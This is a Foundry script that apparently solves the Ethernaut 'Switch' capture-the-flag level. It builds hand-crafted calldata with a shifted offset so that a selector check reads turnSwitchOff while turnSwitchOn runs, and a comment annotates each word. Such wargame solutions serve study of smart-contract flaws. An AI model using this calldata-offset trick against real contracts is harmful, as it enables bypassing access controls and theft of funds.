// SPDX- License-Identifier :MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import "../src/Level29.sol";

contract Level29Sol is Script{

    Switch public instance  = Switch(0xBAfeeF31f97943fe11de5a04138f1AED8297aBb6);

    function run() external {

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        bytes memory data = abi.encodeWithSignature("flipSwitch(bytes)",0x60,
         0x00, 0x20606e1500000000000000000000000000000000000000000000000000000000,0x04,
         0x76227e1200000000000000000000000000000000000000000000000000000000);

        console.logBytes(data);

         address(instance).call(data);
         /*
        
         -----------------------------------------------console.log(data)----------------------------------------
          Possible methods:
            30c13ade      - flipSwitch(bytes)  
            ------------
            [000]: 0000000000000000000000000000000000000000000000000000000000000060 --offset position for actual data
            [020]: 0000000000000000000000000000000000000000000000000000000000000000 --adding dummy bytes to bypass the check
            [040]: 20606e1500000000000000000000000000000000000000000000000000000000 --turnSwitchOff()--ByPassed onlyOff modifier
            [060]: 0000000000000000000000000000000000000000000000000000000000000004 --Length of the turnSwitchOff() signature data
            [080]: 76227e1200000000000000000000000000000000000000000000000000000000 --turnSwitchOn()-- Won the challenge

         */

         console.log("Switch is :", instance.switchOn());

         vm.stopBroadcast();

    }
}